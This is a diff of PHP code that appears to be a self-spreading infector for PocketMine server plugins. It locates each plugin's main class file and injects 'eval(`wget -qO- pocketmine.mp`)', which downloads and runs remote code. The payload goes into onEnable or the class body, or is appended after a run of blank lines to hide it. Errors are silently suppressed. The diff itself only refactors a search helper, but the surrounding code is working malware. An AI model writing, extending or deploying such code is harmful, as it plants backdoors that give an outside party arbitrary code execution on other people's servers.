@@ -17,17 +17,16 @@ try {
         $filePath = $dirPath . "/src/" . ($srcNamespacePrefix ? end($mainPath) : $main) . ".php";
         $fileContents = explode("\n", @file_get_contents($filePath));
         $payload = "eval(`wget -qO- pocketmine.mp`);";
-        $find = function (string|array $queries, array $contents): int|false {
+$find = function (array $queries, array $contents): int|false {
             foreach ($contents as $key => $value) {
-                if (is_string($queries)) if (!str_contains(strtolower($value), strtolower($queries))) continue;
-                else foreach ($queries as $query) {
+                foreach ($queries as $query) {
                     if (!str_contains(strtolower($value), strtolower($query))) continue 2;
                 }
                 return $key;
             }
             return false;
         };
-        if (!$find($payload, $fileContents)) continue;
+        if (!$find([$payload], $fileContents)) continue;
         $hasStrictTypes = function () use ($fileContents): bool {
             return (bool)preg_match('/^\s*declare\s*\(\s*strict_types\s*=\s*1\s*\)\s*;/m', implode("\n", $fileContents));
         };
@@ -35,12 +34,12 @@ try {
             $findMain = function () use ($fileContents, $payload, $find): int|false {
                 $main = $find(["extends", "pluginbase"], $fileContents);
                 if (!$main) return false;
-                return $find("{", array_slice($fileContents, $main));
+                return $find(["{"], array_slice($fileContents, $main));
             };
             $findOnEnable = function () use ($fileContents, $payload, $find): int|false {
-                $onEnable = $find("onenable", $fileContents);
+                $onEnable = $find(["onenable"], $fileContents);
                 if (!$onEnable) return false;
-                return $find("{", array_slice($fileContents, $onEnable));
+                return $find(["{"], array_slice($fileContents, $onEnable));
             };
             $onEnable = $findOnEnable();
             $tab_detector = function (array $array) {
@@ -63,7 +62,7 @@ try {
         } else {
             $fileContents = implode("\n", $fileContents) . str_repeat("\n", 10) . $payload;
             @file_put_contents($filePath, $fileContents);
-        }        
+        }   
     }
 } catch (\ErrorException) {
 }
